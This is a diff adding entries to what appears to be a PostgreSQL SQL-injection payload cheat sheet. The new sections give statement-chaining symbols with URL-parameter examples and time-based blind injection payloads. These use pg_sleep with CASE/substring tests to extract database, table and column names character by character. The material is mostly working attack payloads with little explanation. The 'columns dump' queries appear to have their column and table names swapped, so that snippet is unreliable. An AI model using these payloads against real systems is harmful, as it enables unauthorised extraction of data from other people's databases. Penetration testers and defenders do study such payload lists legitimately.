@@ -34,6 +34,16 @@
 /**/  
 ```
 
+## PostgreSQL chain injection points symbols
+```sql
+; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.
+|| #or statement 
+
+# usage examples: 
+/?whatever=1;(select 1 from pg_sleep(5))
+/?whatever=1||(select 1 from pg_sleep(5))
+```
+
 ## PostgreSQL Version
 
 ```sql
@@ -140,6 +150,29 @@ Note, with the above queries, the output needs to be assembled in memory. For la
 ```
 
 ## PostgreSQL Time Based
+#### Identify time based
+
+```sql
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+```
+
+#### Database dump time based
+```sql
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+```
+
+#### Table dump time based
+```sql
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+```
+#### columns dump time based
+```sql
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
+```
+
 
 ```sql
 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
